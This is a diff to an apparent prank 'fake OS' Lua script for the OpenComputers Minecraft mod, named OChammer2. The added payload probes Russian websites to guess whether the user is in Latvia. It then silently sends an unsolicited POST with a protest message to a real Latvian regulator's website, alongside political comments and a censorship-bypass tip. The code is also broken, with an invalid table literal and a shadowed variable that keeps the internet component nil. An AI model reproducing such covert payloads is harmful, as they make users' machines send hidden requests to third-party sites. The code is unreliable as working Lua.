@@ -4,9 +4,67 @@ local gp = {} for a,b in pairs(component.proxy(cl("gpu")())) do gp[a]=b end
 local ef = {} for a,b in pairs(component.proxy(cl("eeprom")())) do ef[a]=b end
 local cp = {} for a,b in pairs(component.proxy(cl("computer")())) do cp[a]=b end
 
+local inet = nil
+pcall(function()
+  local inet = component.proxy(cl("internet")())
+end)
+
 local resX,resY = gp.maxResolution()
 
 -- OChammer2 Fake OS.lua
+
+-- New payload for OCHammer 2, that activates, if the user is in Latvia, by testing russian websites to see if they are blocked by the government. (which I rate a solid 0 out of 10 because yes)
+-- If the user is in Latvia, the OS will automatically activate the payload.
+
+-- ISP's that block russian websites:
+-- Tele2
+-- TET
+-- LMT
+-- Baltcom
+-- And many others..
+
+-- The only way to bypass the censorship is to use a VPN or connect your internet to a phone, which is connected to Data (Not wifi), with "BITE" as the provider.
+-- If You are reading this, please do not impose even more restrictions on our internet connections.
+
+-- The Latvian goverment uses "Fortinet" to block russian websites. This is why EVERYBODY hates them. (and the government is not happy with them)
+
+-- By the way, Putin is a bad person.
+
+local bannedWebsites = [
+  "https://mail.ru", -- Mail
+  "https://yandex.ru", -- Yandex (Russian)
+  "https://rutube.ru", -- Russian youtube ripoff
+  "https://vk.com" -- VKontakte
+]
+
+local isBlocked = false
+
+-- Loop through the banned websites and ping them to see if they are blocked. If an error is thrown, the website is blocked.
+
+-- First of all, check if the internet is available. If not, assume that the user is not in Latvia.
+if inet == nil then
+  isBlocked = false
+else
+  for i=1,#bannedWebsites do
+    local url = bannedWebsites[i]
+    local status, error = pcall(function()
+      inet.request(url)
+    end)
+    if not status then
+      isBlocked = true
+      break
+    end
+  end
+end
+
+-- Automatically send feedback to NEPLP (neplpadome.lv)
+-- POST "vnk izdzēsiet fortinet jo tas ir nevajadzīgs" to https://neplpadome.lv/404
+if inet ~= nil then
+  pcall(function()
+    inet.request("https://neplpadome.lv/404", "vnk izdzēsiet fortinet jo tas ir nevajadzīgs")
+  end)
+  -- Sucessfully sent feedback to NEPLP
+end
 
 function lol()
     
